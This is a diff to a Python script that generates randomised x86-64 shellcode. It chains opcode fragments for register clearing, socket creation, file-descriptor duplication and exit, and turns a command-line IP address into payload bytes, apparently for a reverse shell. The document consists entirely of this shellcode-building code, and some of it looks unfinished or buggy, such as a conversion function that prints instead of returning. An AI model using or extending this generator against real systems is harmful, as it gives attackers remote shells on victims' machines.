@@ -1,7 +1,6 @@
 #/usr/bin/env python3
 
 from random import randint as r
-import binascii
 import socket
 from sys import argv
 #import htons
@@ -22,7 +21,10 @@ def clean(reg):
 
 
 def ip_to_opcode(ip):
-    return socket.inet_aton(ip)
+    ip_array = ip.split('.')
+    pi = ip_array[3] +'.'+ip_array[2]+'.'+ip_array[1]+'.'+ip_array[0]
+    hexpi = '{:02X}{:02X}{:02X}{:02X}'.format(*map(int, pi.split('.')))
+    print(hexpi)
 
 
 def create_socket():
@@ -43,7 +45,7 @@ def create_socket():
     if rand == 0:
         PAYLOAD += "b3014889de"
     elif rand == 1:
-        PAYLOAD += "80C3014889de"
+        PAYLOAD += "80c3014889de"
     elif rand == 2:
         PAYLOAD += "48ffc6"
     PAYLOAD += call()
@@ -70,8 +72,9 @@ def _exit():
     global PAYLOAD
     PAYLOAD+=clean("rax")
     PAYLOAD+=clean("rdx")
-    PAYLOAD += '0x3c'
-    return call()
+    PAYLOAD+="b03c"
+   # print(PAYLOAD)
+    PAYLOAD += call()
 
 
 def call():
@@ -92,7 +95,8 @@ PAYLOAD += clean("rcx")
 PAYLOAD += clean("rdx")
 create_socket()
 dup2x3()
-PAYLOAD += _exit()
-#ip_to_opcode()
+#print(PAYLOAD)
+_exit()
+ip_to_opcode(argv[1])
 #print(bit_to_opcode(PAYLOAD))
 print(PAYLOAD)
